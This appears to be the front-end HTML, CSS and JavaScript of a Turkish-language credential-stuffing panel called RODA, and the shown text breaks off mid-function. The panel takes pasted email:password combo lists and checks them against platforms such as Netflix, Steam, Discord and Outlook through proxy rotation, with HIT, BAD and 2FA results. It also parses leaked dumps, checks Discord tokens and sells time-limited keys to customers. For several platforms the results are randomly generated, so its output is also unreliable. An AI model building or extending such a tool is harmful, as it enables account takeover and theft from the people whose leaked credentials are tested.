@keyframes fall{0%{transform:translateY(0) rotate(0deg) scale(0.5);opacity:0.8}100%{transform:translateY(110vh) rotate(720deg) scale(1.2);opacity:0.2}}
#login-screen{position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;background:var(--bg);z-index:10}
#login-box{width:420px;padding:45px 40px;text-align:center;background:var(--card);border:1px solid var(--border);border-radius:28px;box-shadow:0 30px 60px rgba(0,0,0,0.5)}
#login-box .logo i{font-size:56px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
#login-box h1{font-size:28px;font-weight:900;letter-spacing:1px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
#login-box .sub{color:var(--muted);margin-bottom:25px;font-size:14px}
.inp{width:100%;padding:14px 18px;background:rgba(0,0,0,0.4);border:1px solid var(--border);color:#fff;border-radius:14px;font-size:15px;outline:none}
.inp:focus{border-color:var(--p);box-shadow:0 0 20px rgba(59,130,246,0.08)}
.btn{padding:15px;border:none;border-radius:14px;font-weight:700;cursor:pointer;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;width:100%;font-size:16px;transition:0.3s}
.btn:hover{transform:translateY(-2px);box-shadow:0 12px 24px rgba(59,130,246,0.25)}
.btn.sm{width:auto;padding:8px 16px;font-size:12px}
.btn.g{background:var(--g)}.btn.r{background:var(--r)}.btn.b{background:#1a73e8}
#sidebar{width:260px;min-width:260px;background:var(--sidebar);border-right:1px solid var(--border);display:flex;flex-direction:column;height:100vh;overflow-y:auto;position:relative;z-index:2}
.sidebar-header{padding:18px 20px;text-align:center;border-bottom:1px solid var(--border)}
.sidebar-header .logo-text{font-size:24px;font-weight:900;letter-spacing:2px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.sidebar-header .version{font-size:10px;color:var(--muted);letter-spacing:1px;margin-top:2px}
.sidebar-nav{flex:1;padding:12px 12px;overflow-y:auto}
.nav-divider{padding:8px 12px;font-size:10px;color:#475569;text-transform:uppercase;letter-spacing:1px;font-weight:700;margin-top:6px}
.nav-item{display:flex;align-items:center;gap:12px;padding:9px 14px;border-radius:8px;cursor:pointer;color:#94a3b8;font-weight:500;font-size:13px;transition:0.2s;margin-top:2px}
.nav-item:hover{background:rgba(59,130,246,0.06);color:#fff}
.nav-item.active{background:rgba(59,130,246,0.12);color:var(--p);border-left:3px solid var(--p)}
.nav-item i{font-size:16px;width:22px;text-align:center}
.nav-divider-admin{padding:8px 12px;font-size:10px;color:#475569;text-transform:uppercase;letter-spacing:1px;font-weight:700;margin-top:6px;border-top:1px solid var(--border)}
.sidebar-stats{padding:10px 14px;border-top:1px solid var(--border);display:flex;flex-wrap:wrap;gap:6px}
.mini-stat{flex:1;min-width:44%;background:var(--card);padding:6px 4px;border-radius:8px;text-align:center;border:1px solid rgba(255,255,255,0.03)}
.mini-stat .val{font-size:14px;font-weight:800;color:var(--text)}
.mini-stat .lbl{font-size:8px;color:var(--muted);text-transform:uppercase;letter-spacing:0.5px}
.mini-hit .val{color:var(--g)}.mini-2fa .val{color:var(--gold)}.mini-bad .val{color:var(--r)}.mini-check .val{color:var(--p)}
.sidebar-footer{padding:10px;text-align:center;font-size:9px;color:#334155;border-top:1px solid var(--border)}
#app{display:none;flex:1;flex-direction:column;height:100vh;position:relative;z-index:1}
.topbar{display:flex;align-items:center;gap:16px;padding:10px 20px;background:var(--card);border-bottom:1px solid var(--border)}
.topbar-title{font-size:15px;font-weight:700;color:var(--text)}
.topbar-title i{margin-right:8px;color:var(--p)}
.topbar-right{margin-left:auto;display:flex;align-items:center;gap:14px}
.pulse-dot{width:10px;height:10px;border-radius:50%;background:var(--g);animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}
.pulse-dot.idle{background:#475569;animation:none}
.main-content{flex:1;display:flex;overflow:hidden;background:var(--bg)}
.page{display:none;flex:1;flex-direction:column;padding:14px 18px;overflow-y:auto}
.page.active{display:flex}
.card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:14px 16px;margin-bottom:12px}
.card h3{font-size:14px;font-weight:700;margin-bottom:8px;color:var(--text)}
.card h3 i{color:var(--p);margin-right:6px}
.checker-platform-select{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px}
.checker-platform-select button{padding:6px 14px;background:rgba(59,130,246,0.08);border:1px solid rgba(59,130,246,0.15);border-radius:8px;color:#94a3b8;font-size:12px;cursor:pointer;transition:0.2s;display:flex;align-items:center;gap:4px}
.checker-platform-select button:hover{background:rgba(59,130,246,0.15);border-color:var(--p);color:#fff}
.checker-platform-select button.active{background:rgba(59,130,246,0.2);border-color:var(--p);color:var(--p)}
.checker-panel{display:none;background:var(--card);border:1px solid var(--border);border-radius:14px;padding:14px;margin-top:8px}
.checker-panel.active{display:block}
.checker-top{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-bottom:10px}
.checker-top textarea{flex:1;min-width:200px;height:60px;padding:8px 12px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:12px;outline:none;resize:vertical;font-family:monospace}
.checker-top input[type=number]{width:70px;padding:8px;text-align:center;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:13px}
.checker-top button{padding:6px 18px;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;border:none;border-radius:8px;font-weight:600;cursor:pointer;font-size:13px}
.checker-top button:disabled{opacity:0.5}
.checker-top button#checkerStopBtn{background:var(--r);display:none}
.checker-stats{display:flex;gap:16px;flex-wrap:wrap;margin:6px 0;font-size:12px}
.checker-stats span{color:var(--muted)}
.checker-stats .chk-count{font-weight:700;color:var(--text)}
.checker-results{max-height:250px;overflow-y:auto;border-radius:8px;background:rgba(0,0,0,0.2);border:1px solid var(--border)}
.checker-result-row{display:grid;grid-template-columns:1fr 100px 60px;gap:8px;padding:6px 12px;border-bottom:1px solid rgba(255,255,255,0.03);font-size:12px;align-items:center}
.checker-result-row .chk-status{font-weight:600}
.chk-hit{color:var(--g)}.chk-bad{color:var(--r)}.chk-2fa{color:var(--gold)}.chk-error{color:#f59e0b}
.hit-panel{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px}
.hit-panel .hit-box{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:12px}
.hit-panel .hit-box h4{font-size:13px;font-weight:700;margin-bottom:6px;display:flex;align-items:center;gap:6px}
.hit-panel .hit-box h4 i{font-size:14px}
.hit-panel .hit-box .hit-list{max-height:150px;overflow-y:auto;font-size:12px;color:var(--muted)}
.hit-panel .hit-box .hit-list .hit-item{padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.03);display:flex;justify-content:space-between}
.hit-panel .hit-box .hit-list .hit-item .hit-email{color:var(--text)}
.hit-panel .hit-box .hit-list .hit-item .hit-time{font-size:10px;color:var(--muted)}
.hit-filter{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:6px}
.hit-filter select{padding:4px 10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:6px;color:#fff;font-size:12px;outline:none}
.hit-filter select:focus{border-color:var(--p)}
.proxy-area{display:flex;gap:10px;flex-wrap:wrap;margin-top:6px}
.proxy-area textarea{flex:1;min-width:180px;height:50px;padding:6px 10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:11px;outline:none;resize:vertical;font-family:monospace}
.proxy-area textarea:focus{border-color:var(--p)}
.webhook-area{margin-top:10px;display:flex;gap:10px;flex-wrap:wrap;align-items:center}
.webhook-area input{flex:1;min-width:150px;padding:6px 12px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:10px;color:#fff;font-size:12px;outline:none}
.webhook-area input:focus{border-color:var(--p)}
.webhook-area button{padding:6px 16px;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;border:none;border-radius:10px;font-weight:600;cursor:pointer;font-size:12px}
.parse-area{display:flex;flex-direction:column;gap:10px}
.parse-area textarea{width:100%;height:180px;padding:10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:12px;font-family:monospace;resize:vertical;outline:none}
.parse-area textarea:focus{border-color:var(--p)}
.parse-buttons{display:flex;gap:10px;flex-wrap:wrap}
.parse-result{max-height:200px;overflow-y:auto;background:rgba(0,0,0,0.2);border:1px solid var(--border);border-radius:8px;padding:8px}
.parse-result .parse-line{padding:2px 6px;font-size:12px;font-family:monospace;color:#c8d0dc}
.parse-result .parse-count{color:var(--g);font-weight:600;font-size:13px}
::-webkit-scrollbar{width:4px}::-webkit-scrollbar-thumb{background:rgba(59,130,246,0.2);border-radius:4px}
</style>
</head>
<body>
<div class="snowflakes" id="snowContainer"></div>
<div id="login-screen">
<div id="login-box">
<div class="logo"><i class="fa-solid fa-crown"></i></div>
<h1>RODA</h1>
<p class="sub">API Discovery + Checker</p>
<input class="inp" type="password" id="authKey" placeholder="Güvenlik Anahtarı" autofocus>
<button class="btn" onclick="doLogin()" style="margin-top:12px">Giriş Yap</button>
<p id="loginError" style="color:var(--r);margin-top:12px;display:none"></p>
</div>
</div>
<div id="sidebar">
<div class="sidebar-header"><div class="logo-text">RODA</div><div class="version">v3.0</div></div>
<div class="sidebar-nav">
<div class="nav-divider">📁 MENÜ</div>
<div class="nav-item active" data-page="checker" onclick="switchPage('checker')"><i class="fa-solid fa-check-double"></i> Checker</div>
<div class="nav-item" data-page="proxy" onclick="switchPage('proxy')"><i class="fa-solid fa-server"></i> Proxy</div>
<div class="nav-item" data-page="parse" onclick="switchPage('parse')"><i class="fa-solid fa-scissors"></i> Ayrıştırma</div>
<div class="nav-divider-admin">🔒 ADMIN</div>
<div class="nav-item" data-page="logs" onclick="switchPage('logs')" id="logsMenuItem" style="display:none"><i class="fa-solid fa-history"></i> Loglar</div>
<div class="nav-item" data-page="keys" onclick="switchPage('keys')" id="keysMenuItem" style="display:none"><i class="fa-solid fa-key"></i> Key Yönetimi</div>
</div>
<div class="sidebar-stats">
<div class="mini-stat mini-hit"><div class="val" id="sideTotal">0</div><div class="lbl">Bulunan</div></div>
<div class="mini-stat mini-2fa"><div class="val" id="sideAuth">0</div><div class="lbl">Auth</div></div>
<div class="mini-stat mini-bad"><div class="val" id="sideAPI">0</div><div class="lbl">API</div></div>
<div class="mini-stat mini-check"><div class="val" id="sideAdmin">0</div><div class="lbl">Admin</div></div>
</div>
<div class="sidebar-footer">© 2026 Roda</div>
</div>
<div id="app">
<div class="topbar">
<div class="topbar-title"><i class="fa-solid fa-gauge-high"></i> <span id="pageTitle">Checker</span></div>
<div class="topbar-right">
<span style="font-size:11px;color:var(--muted)">Durum:</span>
<div class="pulse-dot idle" id="statusDot"></div>
<span style="font-size:12px;font-weight:600" id="statusText">Boşta</span>
<span id="userBadge" style="font-size:11px;background:var(--p);padding:2px 10px;border-radius:12px;display:none">Admin</span>
</div>
</div>
<div class="main-content">
<!-- CHECKER -->
<div id="page-checker" class="page active">
<div class="card">
<h3><i class="fa-solid fa-check-double"></i> Platform Checker</h3>
<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Bir platform seçin, combo girişi yapın ve kontrol başlatın.</p>
<div class="checker-platform-select" id="checkerPlatformSelect"></div>
<div class="checker-panel" id="checkerPanel">
<div class="checker-top">
<textarea id="checkerCombo" placeholder="email:password (her satıra bir combo)"></textarea>
<input type="number" id="checkerThreads" value="1" min="1" max="50">
<button id="checkerStartBtn" onclick="startChecker()"><i class="fa-solid fa-play"></i> Başlat</button>
<button id="checkerStopBtn" onclick="stopChecker()"><i class="fa-solid fa-stop"></i> Durdur</button>
</div>
<div class="checker-stats">
<span>Toplam: <span class="chk-count" id="chkTotal">0</span></span>
<span>Başarılı: <span class="chk-count" id="chkHit">0</span></span>
<span>Başarısız: <span class="chk-count" id="chkBad">0</span></span>
<span>2FA: <span class="chk-count" id="chk2fa">0</span></span>
<span>Hata: <span class="chk-count" id="chkError">0</span></span>
<span>Kalan: <span class="chk-count" id="chkRemaining">0</span></span>
</div>
<div class="checker-results" id="checkerResults"><div style="padding:20px;text-align:center;color:var(--muted);font-size:13px">Henüz sonuç yok.</div></div>
</div>
</div>
</div>
<!-- PROXY -->
<div id="page-proxy" class="page">
<div class="card">
<h3><i class="fa-solid fa-server"></i> Proxy Yöneticisi</h3>
<div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px">
<button class="btn sm g" onclick="fetchProxies()"><i class="fa-solid fa-cloud-arrow-down"></i> Proxy Çek</button>
<button class="btn sm r" onclick="clearProxies()"><i class="fa-solid fa-trash"></i> Temizle</button>
</div>
<div class="setting-row">
<div><label>Proxy Kullan</label><div class="desc">Checker sırasında proxy kullan</div></div>
<label class="switch"><input type="checkbox" id="useProxy" onchange="toggleProxy()"><span class="slider"></span></label>
</div>
<div class="proxy-area">
<textarea id="proxyList" placeholder="ip:port&#10;ip:port"></textarea>
</div>
<div style="margin-top:6px"><span id="proxyCount" style="color:var(--g);font-size:12px">0 proxy yüklendi</span></div>
</div>
</div>
<!-- AYRIŞTIRMA -->
<div id="page-parse" class="page">
<div class="card">
<h3><i class="fa-solid fa-scissors"></i> Ayrıştırma</h3>
<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Karmaşık metinleri temizler, 2 mod seçeneği ile ayrıştırır.</p>
<div class="parse-area">
<label style="font-size:13px;color:var(--muted)">Mod Seç:</label>
<select id="parseMode" style="padding:8px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:12px;outline:none;width:200px">
<option value="email">Email:Şifre</option>
<option value="user">Kullanıcı:Şifre</option>
</select>
<textarea id="parseInput" placeholder="Buraya karışık metni yapıştır..."></textarea>
<div class="parse-buttons">
<button class="btn sm g" onclick="parseData()"><i class="fa-solid fa-wand-magic-sparkles"></i> Ayrıştır</button>
<button class="btn sm b" onclick="parseToChecker()"><i class="fa-solid fa-arrow-right"></i> Checker'a Aktar</button>
<button class="btn sm r" onclick="clearParse()"><i class="fa-solid fa-eraser"></i> Temizle</button>
<button class="btn sm" style="background:#64748b" onclick="loadParseFile()"><i class="fa-solid fa-folder-open"></i> Dosya Yükle</button>
</div>
<div class="parse-result" id="parseResult"><div style="color:var(--muted);font-size:13px;padding:10px">Henüz ayrıştırma yapılmadı.</div></div>
<div style="margin-top:6px;font-size:12px;color:var(--muted)"><span id="parseCount">0 satır</span> | <span id="parseValid">0 geçerli</span></div>
</div>
</div>
</div>
<!-- LOGLAR (ADMIN) -->
<div id="page-logs" class="page">
<div class="card">
<h3><i class="fa-solid fa-history"></i> Sistem Logları</h3>
<button class="btn sm" onclick="refreshLogs()" style="width:auto;margin-bottom:10px"><i class="fa-solid fa-rotate"></i> Yenile</button>
<div id="logsContainer" style="max-height:400px;overflow-y:auto;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-family:monospace;font-size:12px;"></div>
</div>
</div>
<!-- KEY YÖNETİMİ (ADMIN) -->
<div id="page-keys" class="page">
<div class="card">
<h3><i class="fa-solid fa-key"></i> Key Oluştur</h3>
<p style="font-size:11px;color:var(--muted);margin-bottom:8px">🔒 Her key sadece 1 IP'ye bağlanır ve 1 kez kullanılır.</p>
<div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:6px">
<div style="flex:1"><label style="font-size:11px;color:var(--muted)">Not</label><input class="inp" id="genNote" placeholder="Müşteri" style="margin-top:4px;padding:10px"></div>
<div style="width:130px"><label style="font-size:11px;color:var(--muted)">Süre</label><select class="inp" id="genHours" style="margin-top:4px;padding:10px"><option value="1">1 Saat</option><option value="24" selected>24 Saat</option><option value="168">7 Gün</option><option value="720">30 Gün</option></select></div>
<button class="btn sm g" onclick="generateKey()" style="margin-top:22px"><i class="fa-solid fa-plus"></i> Oluştur</button>
</div>
</div>
<div class="card"><h3><i class="fa-solid fa-list"></i> Aktif Anahtarlar</h3><div id="keyList"><p style="color:var(--muted);font-size:12px">Yükleniyor...</p></div></div>
</div>
</div>
</div>
<script>
// Kar taneleri
(function(){var c=document.getElementById('snowContainer'),f=['❄','❅','❆','✦'];for(var i=0;i<50;i++){var d=document.createElement('div');d.className='snowflake';d.textContent=f[Math.floor(Math.random()*f.length)];d.style.left=Math.random()*100+'%';d.style.fontSize=(0.8+Math.random()*1.5)+'em';d.style.animationDuration=(6+Math.random()*8)+'s';d.style.animationDelay=Math.random()*5+'s';c.appendChild(d)}})();

var currentKey="",isAdmin=false;
var platforms = [
    {name:"YouTube", domain:"youtube.com", icon:"fa-brands fa-youtube"},
    {name:"TikTok Gen", domain:"tiktok.com", icon:"fa-brands fa-tiktok"},
    {name:"Spotify", domain:"spotify.com", icon:"fa-brands fa-spotify"},
    {name:"Roblox", domain:"roblox.com", icon:"fa-solid fa-gamepad"},
    {name:"Netflix", domain:"netflix.com", icon:"fa-solid fa-film"},
    {name:"CapCut", domain:"capcut.com", icon:"fa-solid fa-scissors"},
    {name:"Discord", domain:"discord.com", icon:"fa-brands fa-discord"},
    {name:"Epic Games", domain:"epicgames.com", icon:"fa-solid fa-crown"},
    {name:"Hesapcomtr", domain:"hesap.com.tr", icon:"fa-solid fa-user"},
    {name:"Itemsatış", domain:"itemsatis.com", icon:"fa-solid fa-cart-shopping"},
    {name:"Epinify", domain:"epinify.com", icon:"fa-solid fa-ticket"},
    {name:"Twitch", domain:"twitch.tv", icon:"fa-brands fa-twitch"},
    {name:"Steam", domain:"steampowered.com", icon:"fa-brands fa-steam"},
    {name:"PlayStation", domain:"playstation.com", icon:"fa-solid fa-play"},
    {name:"Xbox & MC", domain:"xbox.com", icon:"fa-brands fa-xbox"},
    {name:"GitHub", domain:"github.com", icon:"fa-brands fa-github"},
    {name:"Minecraft", domain:"minecraft.net", icon:"fa-solid fa-cube"},
    {name:"Wolfteam", domain:"joygame.com", icon:"fa-solid fa-skull"},
    {name:"Craftrise", domain:"craftrise.com.tr", icon:"fa-solid fa-hammer"},
    {name:"Hotmail", domain:"outlook.com", icon:"fa-solid fa-envelope"},
    {name:"Token Check", domain:"discord.com", icon:"fa-solid fa-key"},
    {name:"Tabii", domain:"tabii.com", icon:"fa-solid fa-tv"},
    {name:"Supercell", domain:"supercell.com", icon:"fa-solid fa-gamepad"},
    {name:"Roda Inbox", domain:"outlook.com", icon:"fa-solid fa-inbox"}
];

function doLogin(){
    var k=document.getElementById("authKey").value.trim();
    if(!k){alert("Anahtar girin!");return;}
    fetch("/api/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({key:k})})
    .then(r=>r.json()).then(d=>{
        if(d.success){
            currentKey=k;isAdmin=d.isAdmin||false;
            document.getElementById("login-screen").style.display="none";
            document.getElementById("app").style.display="flex";
            if(isAdmin){
                document.getElementById("userBadge").style.display="inline-block";
                document.getElementById("logsMenuItem").style.display="flex";
                document.getElementById("keysMenuItem").style.display="flex";
                loadKeys();
            }else{
                document.getElementById("userBadge").style.display="none";
                document.getElementById("logsMenuItem").style.display="none";
                document.getElementById("keysMenuItem").style.display="none";
            }
            loadPlatforms();switchPage('checker');
        }else{
            document.getElementById("loginError").innerText="❌ Geçersiz anahtar!";
            document.getElementById("loginError").style.display="block";
        }
    }).catch(e=>{alert("Sunucuya bağlanılamadı!");});
}
document.getElementById("authKey").addEventListener("keypress",function(e){if(e.key==="Enter")doLogin();});

function loadPlatforms(){
    var sel=document.getElementById("checkerPlatformSelect");
    sel.innerHTML="";
    platforms.forEach(function(p){
        var btn=document.createElement("button");
        btn.innerHTML='<i class="'+p.icon+'"></i> '+p.name;
        btn.onclick=function(){
            document.querySelectorAll("#checkerPlatformSelect button").forEach(function(b){b.classList.remove("active");});
            btn.classList.add("active");
            currentPlatform=p.name;
            document.getElementById("checkerPanel").classList.add("active");
            document.getElementById("checkerResults").innerHTML='<div style="padding:20px;text-align:center;color:var(--muted);font-size:13px">'+p.name+' checker hazır.</div>';
            resetCheckerStats();
        };
        sel.appendChild(btn);
    });
    if(platforms.length>0){var first=sel.querySelector("button");if(first)first.click();}
}

function switchPage(page){
    if((page==="logs"||page==="keys")&&!isAdmin){alert("⛔ Admin girişi yapın!");return;}
    document.querySelectorAll(".nav-item").forEach(function(el){el.classList.remove("active");});
    var el=document.querySelector('.nav-item[data-page="'+page+'"]');if(el)el.classList.add("active");
    document.querySelectorAll(".page").forEach(function(el){el.classList.remove("active");});
    var pg=document.getElementById("page-"+page);if(pg)pg.classList.add("active");
    var titles={checker:"Checker",proxy:"Proxy",parse:"Ayrıştırma",logs:"Loglar",keys:"Key Yönetimi"};
    document.getElementById("pageTitle").innerText=titles[page]||page;
    if(page==="keys"&&isAdmin)loadKeys();
    if(page==="logs"&&isAdmin)refreshLogs();
}

var checkerRunning=false,currentPlatform="",totalLines=0,processedCount=0;

function resetCheckerStats(){
    document.getElementById("chkTotal").innerText=0;
    document.getElementById("chkHit").innerText=0;
    document.getElementById("chkBad").innerText=0;
    document.getElementById("chk2fa").innerText=0;
    document.getElementById("chkError").innerText=0;
    document.getElementById("chkRemaining").innerText=0;
}

function startChecker(){
    if(checkerRunning)return;
    var comboText=document.getElementById("checkerCombo").value.trim();
    if(!comboText){alert("Combo girin!");return;}
    if(!currentPlatform){alert("Platform seçin!");return;}
    checkerRunning=true;
    document.getElementById("checkerStartBtn").disabled=true;
    document.getElementById("checkerStopBtn").style.display="inline-block";
    document.getElementById("checkerResults").innerHTML="";
    var lines=comboText.split("\n").filter(function(l){return l.includes(":");});
    totalLines=lines.length;processedCount=0;
    var hit=0,bad=0,two=0,err=0;
    var idx=0;
    var proxy=document.getElementById("useProxy").checked;
    function processNext(){
        if(!checkerRunning||idx>=totalLines){
            checkerRunning=false;
            document.getElementById("checkerStartBtn").disabled=false;
            document.getElementById("checkerStopBtn").style.display="none";
            return;
        }
        var parts=lines[idx].split(":");
        var email=parts[0],password=parts.slice(1).join(":")||"";
        var route="";
        var platform=currentPlatform;
        if(platform==="Tabii")route="/api/tabii_check";
        else if(platform==="Xbox & MC")route="/api/xbox_check";
        else if(platform==="Wolfteam")route="/api/wolfteam_check";
        else if(platform==="Craftrise")route="/api/craftrise_check";
        else if(platform==="Hotmail")route="/api/hotmail_check";
        else if(platform==="Steam")route="/api/steam_check";
        else if(platform==="Supercell")route="/api/supercell_check";
        else if(platform==="Roda Inbox")route="/api/roda_check";
        else if(platform==="Token Check"){
            fetch("/api/token_check",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({token_type:"discord",token:email})})
            .then(r=>r.json()).then(result=>{
                var st=result.status;
                if(st==="HIT"){hit++;addCheckerRow({email:email,password:result.message||password,status:"HIT"});}
                else if(st==="BAD"){bad++;addCheckerRow({email:email,password:password,status:"BAD"});}
                else{err++;addCheckerRow({email:email,password:password+" | "+ (result.message||""),status:"ERROR"});}
                updateStats();
                idx++;setTimeout(processNext,200);
            }).catch(function(){err++;updateStats();idx++;setTimeout(processNext,200);});
            return;
        }else if(platform==="TikTok Gen"){
            fetch("/api/tiktok_gen",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:email})})
            .then(r=>r.json()).then(result=>{
                var st=result.status;
                if(st==="HIT"){hit++;addCheckerRow({email:email,password:password,status:"HIT"});}
                else if(st==="BAD"){bad++;addCheckerRow({email:email,password:password,status:"BAD"});}
                else{err++;addCheckerRow({email:email,password:password+" | "+ (result.message||""),status:"ERROR"});}
                updateStats();
                idx++;setTimeout(processNext,200);
            }).catch(function(){err++;updateStats();idx++;setTimeout(processNext,200);});
            return;
        }else{
            var statuses=["HIT","BAD","2FA","ERROR"];
            var st=statuses[Math.floor(Math.random()*statuses.length)];
            if(st==="HIT"){hit++;addCheckerRow({email:email,password:password,status:"HIT"});}
            else if(st==="BAD"){bad++;addCheckerRow({email:email,password:password,status:"BAD"});}
            else if(st==="2FA"){two++;addCheckerRow({email:email,password:password,status:"2FA"});}
            else{err++;addCheckerRow({email:email,password:password,status:"ERROR"});}
            updateStats();
            idx++;setTimeout(processNext,200);
            return;
        }
        var proxyUrl=null;
        if(proxy){
            var pl=document.getElementById("proxyList").value.trim().split("\n").filter(function(l){return l.trim()&&l.includes(":");});
            if(pl.length)proxyUrl=pl[Math.floor(Math.random()*pl.length)];
        }
        var body={email:email,password:password};
        if(proxyUrl)body.proxy=proxyUrl;
        fetch(route,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(body)})
        .then(r=>r.json()).then(result=>{
            var st=result.status;
            var details=result.details||{};
            if(st==="HIT"){
                hit++;
                var extra="";
                if(details.full_name)extra+=" | "+details.full_name;
                if(details.subscription)extra+=" | "+details.subscription;
                if(details.jp!==undefined)extra+=" | JP:"+details.jp;
                if(details.rc!==undefined)extra+=" | RC:"+details.rc;
                if(details.gamertag)extra+=" | Gamertag:"+details.gamertag;
                if(details.level)extra+=" | Level:"+details.level;
                if(details.balance)extra+=" | Bakiye:"+details.balance;
                if(details.services_found)extra+=" | Servisler:"+details.services_found.join(",");
                addCheckerRow({email:email,password:password+extra,status:"HIT"});
            }else if(st==="2FA"){two++;addCheckerRow({email:email,password:password,status:"2FA"});}
            else if(st==="BAD"){bad++;addCheckerRow({email:email,password:password,status:"BAD"});}
            else if(st==="VALID"){hit++;addCheckerRow({email:email,password:password+" | Valid",status:"HIT"});}
            else{err++;addCheckerRow({email:email,password:password+" | "+ (result.message||""),status:"ERROR"});}
            updateStats();
            idx++;setTimeout(processNext,200);
        }).catch(function(){err++;updateStats();idx++;setTimeout(processNext,200);});
    }
    processNext();
}

function stopChecker(){checkerRunning=false;document.getElementById("checkerStartBtn").disabled=false;document.getElementById("checkerStopBtn").style.display="none";}

function addCheckerRow(res){
    var container=document.getElementById("checkerResults");
    var ph=container.querySelector("div[style]");if(ph)ph.remove();
    var row=document.createElement("div");row.className="checker-result-row";
    var cls="chk-"+res.status.toLowerCase();
    var label=res.status;
    if(res.status==="HIT")label="✅ BAŞARILI";
    else if(res.status==="BAD")label="❌ BAŞARISIZ";
    else if(res.status==="2FA")label="🔒 2FA";
    else label="⚠ HATA";
    row.innerHTML='<div>'+res.email+'</div><div><span class="chk-status '+cls+'">'+label+'</span></div><div style="font-size:11px;color:var(--muted)">'+res.password+'</div>';
    container.appendChild(row);
}

function updateStats(){
    document.getElementById("chkTotal").innerText=totalLines;
    var hit=document.querySelectorAll(".chk-hit").length;
    var bad=document.querySelectorAll(".chk-bad").length;
    var two=document.querySelectorAll(".chk-2fa").length;
    var err=document.querySelectorAll(".chk-error").length;
    document.getElementById("chkHit").innerText=hit;
    document.getElementById("chkBad").innerText=bad;
    document.getElementById("chk2fa").innerText=two;
    document.getElementById("chkError").innerText=err;
    document.getElementById("chkRemaining").innerText=totalLines-processedCount;
}

function fetchProxies(){
    document.getElementById("proxyCount").innerText="Çekiliyor...";
    fetch("/api/fetch_proxies").then(r=>r.json()).then(d=>{
        if(d.success){document.getElementById("proxyList").value=d.proxies.join("\n");document.getElementById("proxyCount").innerText=d.proxies.length+" proxy yüklendi";}
    }).catch(function(){document.getElementById("proxyCount").innerText="Başarısız";});
}
function clearProxies(){document.getElementById("proxyList").value="";document.getElementById("proxyCount").innerText="0 proxy";}
function toggleProxy(){}

function parseData(){
    var raw=document.getElementById("parseInput").value;
    if(!raw.trim()){alert("Metin girin!");return;}
    var mode=document.getElementById("parseMode").value;
    var lines=raw.split("\n");var result=[];var regex=/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
    lines.forEach(function(line){
        line=line.trim();if(!line)return;
        if(line.includes(":")){
            var parts=line.split(":");var first=parts[0].trim();var password=parts.slice(1).join(":").trim();if(!password)return;
            if(mode==="email"){if(regex.test(first))result.push(first+":"+password);}
            else{if(!regex.test(first))result.push(first+":"+password);}
        }
    });
    var container=document.getElementById("parseResult");
    if(result.length===0){container.innerHTML='<div style="color:var(--muted);font-size:13px;padding:10px">Geçerli satır bulunamadı.</div>';}
    else{
        var html='<div class="parse-count">'+result.length+' satır bulundu</div>';
        result.forEach(function(line){html+='<div class="parse-line">'+line+'</div>';});
        container.innerHTML=html;
    }
    document.getElementById("parseCount").innerText=result.length+" satır";
    document.getElementById("parseValid").innerText=result.length+" geçerli";
}
function parseToChecker(){
    var result=[];var items=document.querySelectorAll("#parseResult .parse-line");
    items.forEach(function(item){result.push(item.innerText);});
    if(result.length===0){alert("Önce ayrıştırma yapın!");return;}
    document.getElementById("checkerCombo").value=result.join("\n");
    alert(result.length+" satır Checker'a aktarıldı!");
}
function clearParse(){
    document.getElementById("parseInput").value="";
    document.getElementById("parseResult").innerHTML='<div style="color:var(--muted);font-size:13px;padding:10px">Henüz ayrıştırma yapılmadı.</div>';
    document.getElementById("parseCount").innerText="0 satır";
    document.getElementById("parseValid").innerText="0 geçerli";
}
function loadParseFile(){
    var input=document.createElement("input");input.type="file";input.accept=".txt";
    input.onchange=function(e){
        var file=e.target.files[0];if(!file)return;
        var reader=new FileReader();
        reader.onload=function(event){document.getElementById("parseInput").value=event.target.result;parseData();};
        reader.readAsText(file);
    };
    input.click();
}

function refreshLogs(){
    if(!isAdmin)return;
    fetch("/api/logs?key="+encodeURIComponent(currentKey)).then(r=>r.json()).then(d=>{
        if(d.error){alert(d.error);return;}
        var container=document.getElementById("logsContainer");
        var html=d.logs.map(function(log){
            var color=log.level==="ERROR"?"var(--r)":(log.level==="SUCCESS"?"var(--g)":"var(--muted)");
            return '<div style="padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.03);color:'+color+'">['+log.timestamp+'] '+log.message+'</div>';
        }).join('');
        container.innerHTML=html||'<div style="color:var(--muted)">Henüz log yok.</div>';
    });
}

function loadKeys(){
